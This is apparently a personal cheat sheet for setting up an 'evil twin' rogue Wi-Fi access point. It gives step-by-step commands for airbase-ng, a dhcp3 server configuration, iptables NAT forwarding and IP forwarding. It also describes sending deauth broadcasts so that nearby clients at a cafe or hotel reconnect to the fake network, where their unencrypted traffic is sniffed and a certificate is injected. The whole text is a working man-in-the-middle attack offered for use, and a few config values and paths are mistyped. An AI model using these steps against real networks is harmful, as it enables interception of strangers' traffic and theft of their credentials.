    airbase-ng can make a fake AP!
    dchpd3 is a DHCP server!
        we can make a fake DHCP server as a MiTM attack to intercept all clients' network activity.
            we only forward their traffic to the network as always, but we can Sniff all un-encrypted packets and even if they don't be careful about their activities we can inject our Certificate ;)
            and we are routing to the Internet via Ethernet ;)
    Evil Twin is when we are emulating the same AP, but stronger to some clients or doing Deauth attack ;)
        like creating a fake WIFI near a cafe or hotel ;)
        now, you can get new clients connected to do all we described above ;)
        even we can send a Deauth broadcast to make them a force to reconnect. then some of them are near to us so connect to our fake WIFI :D
            that's it!
    MiTM attack
    Commands
        sudo apt install dhcp3-server
            installing a DHCP server to give the clients an IP address after running a fake AP ;)
        mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.backup
            renaming the config file of the DHCP server.
        nano /etc/dhcp3/dhcpd.conf
            ddns-update-style ad-hoc;
            default-lease-tme 600;
            max-lease-time 7200;
            subnet 192.168.2.0 netmask 255.255.255.0 {
                option subnet-mask 255.255.255.0;
                option broadcast-address 192.168.2.255;
                option routers 192.168.2.1;
                option domain-name-servers 8.8.8.8;
                range 192.168.2.51 192.168.2.100;
            }
        airmon-ng start <interface>
            start monitoring mode of the interface
        airodump-ng <monitoring enabled interface>
            watching the network to find out what networks we have and which one is better to make a fake AP for it ;)
        airbase-ng --essid <new AP SSID. like "Free HotSpot"> -c <channel number> <monitoring enabled interface>
            creating an AP with the name we mentioned as an interface! (like at0)
        ifconfig at0 up
            make it up
        ifconfig at0 <IP address. like 192.168.2.1/24>
            giving it an IP address. as you remember, we configured this IP address as default Gateway!
        route add -net <network IP. like 192.168.2.0> netmask <netmask. like 255.255.255.0> gw <gateway. like 192.168.2.1>
            adding a route to forward all packets is in this network to providing the Internet to all connected clients ;)
        dhcpd3 -cf /etc/dhcpd3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid <AP interface. like at0>
            run the DHCP server
        /etc/init.d/dhcp3-server start
            starting the DHCP service
        doing some works to forwarding all clients packets:
            iptables --flush
            iptables --table nat --flush
            iptables --delete-chain
            iptables --table nat --delete-chain
            iptables --table nat --append POSTROUTING --out-interface <Internet interface. like eth0> -j MASQUERADE
            iptables --append FORWARD --in-interface <fake AP interface. like at0> -j ACCEPT  
            echo 1 > /proc/sys/net/ipv4/ip_forward
